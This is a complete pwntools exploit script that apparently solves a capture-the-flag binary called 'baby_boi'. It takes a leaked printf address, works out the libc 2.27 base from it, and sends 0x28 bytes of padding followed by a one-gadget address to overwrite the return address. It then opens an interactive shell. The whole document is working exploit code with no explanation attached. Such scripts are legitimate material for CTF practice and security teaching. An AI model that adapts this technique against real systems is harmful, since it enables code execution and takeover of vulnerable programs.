#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./baby_boi")

p = process("./baby_boi_patched")
libc = ELF('libc-2.27.so')
# gdb.attach(p, gdbscript="break *0x000000000040072e")

print(p.recvline())

p.recvuntil("ere I am: ")
# extern_printf_addr = int(p.recvline().strip().ljust(8, b'\x00'), 16)

leak = p.recvline()
leak = leak.strip(b"\n")

libc_base = int(leak,16) - libc.symbols['printf']
# libc_base = extern_printf_addr - 0x0000000000064e80
log.info(f'{hex(libc_base)=}')

#log.info(f'{hex(extern_printf_addr)=}')
#log.info(f'{hex(leak)=}')

padding = b'a'*0x28
one_shot = libc_base + 0x4f322

payload = padding + p64(one_shot)

log.info(f'{hex(one_shot)=}')

p.sendline(payload)



p.interactive()
